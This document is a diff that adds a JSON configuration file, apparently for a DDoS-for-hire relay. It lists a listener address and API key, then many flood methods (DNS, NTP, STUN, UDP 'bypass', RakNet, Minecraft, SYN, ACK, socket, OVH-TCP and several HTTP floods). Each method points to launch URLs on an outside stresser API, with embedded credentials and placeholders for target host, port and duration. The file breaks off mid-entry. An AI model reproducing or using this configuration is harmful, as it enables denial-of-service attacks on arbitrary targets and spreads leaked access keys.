@@ -1,0 +1,1603 @@
+{
+    "listener":"45.88.90.113:22223",
+    "api_key":"PwBlGAJbuOnRK86xE7ut",
+    "timeout":3,
+    "methods":{
+        "dns":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "ntp":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "stun":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"stun",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udp-bypass":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udp-bypassv2":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"raknet",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "minecraft":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"minecraft",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "syn":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "ack":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ack",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "socketflood":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "ovh":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ovh-tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "ultra":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ethereal",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "bypass":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-ares",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "socket":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-socket",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "browser":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
